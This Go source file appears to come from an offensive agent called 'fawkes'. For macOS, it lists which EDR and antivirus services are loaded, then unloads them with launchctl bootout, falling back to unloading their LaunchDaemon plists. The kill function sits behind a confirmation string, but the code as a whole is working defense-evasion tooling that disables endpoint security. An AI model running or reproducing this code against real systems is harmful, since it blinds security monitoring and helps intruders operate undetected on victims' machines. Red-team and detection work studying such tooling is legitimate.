//go:build darwin

package commands

import (
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

// serviceEdrEnumDarwin enumerates EDR/AV services on macOS via launchctl.
func serviceEdrEnumDarwin() structs.CommandResult {
	candidates := edrMatchesForPlatform("darwin")
	var results []edrEnumResult

	for _, entry := range candidates {
		// Check if launchd label is loaded
		out, err := exec.Command("launchctl", "list", entry.ServiceName).CombinedOutput()
		if err != nil {
			continue // Not loaded
		}

		status := "running"
		output := string(out)
		if strings.Contains(output, "Could not find") {
			continue
		}

		results = append(results, edrEnumResult{
			ServiceName: entry.ServiceName,
			Vendor:      entry.Vendor,
			Product:     entry.Product,
			Status:      status,
		})
	}

	return successResult(formatEdrEnumResults(results))
}

// serviceEdrKillDarwin attempts to unload detected EDR/AV services via launchctl.
func serviceEdrKillDarwin(args serviceArgs) structs.CommandResult {
	if strings.ToUpper(args.Confirm) != "EDR-KILL" {
		return errorResult("Error: EDR-KILL requires -confirm EDR-KILL safety gate. This will attempt to unload security services.")
	}

	candidates := edrMatchesForPlatform("darwin")
	var sb strings.Builder
	sb.WriteString("[*] EDR/AV Service Kill Results:\n\n")

	killed := 0
	failed := 0

	for _, entry := range candidates {
		// Check if loaded
		_, err := exec.Command("launchctl", "list", entry.ServiceName).CombinedOutput()
		if err != nil {
			continue
		}

		// Attempt to unload
		unloadOut, unloadErr := exec.Command("launchctl", "bootout", "system", entry.ServiceName).CombinedOutput()

		if unloadErr != nil {
			// Try legacy unload
			unloadOut, unloadErr = exec.Command("launchctl", "unload", "-w", fmt.Sprintf("/Library/LaunchDaemons/%s.plist", entry.ServiceName)).CombinedOutput()
		}

		if unloadErr != nil {
			sb.WriteString(fmt.Sprintf("  [!] %s (%s): UNLOAD FAILED — %s\n", entry.ServiceName, entry.Product, strings.TrimSpace(string(unloadOut))))
			failed++
		} else {
			sb.WriteString(fmt.Sprintf("  [+] %s (%s): UNLOADED\n", entry.ServiceName, entry.Product))
			killed++
		}
	}

	if killed == 0 && failed == 0 {
		sb.WriteString("  No loaded EDR/AV services found to unload.\n")
	} else {
		sb.WriteString(fmt.Sprintf("\n  Summary: %d unloaded, %d failed\n", killed, failed))
	}

	return successResult(sb.String())
}
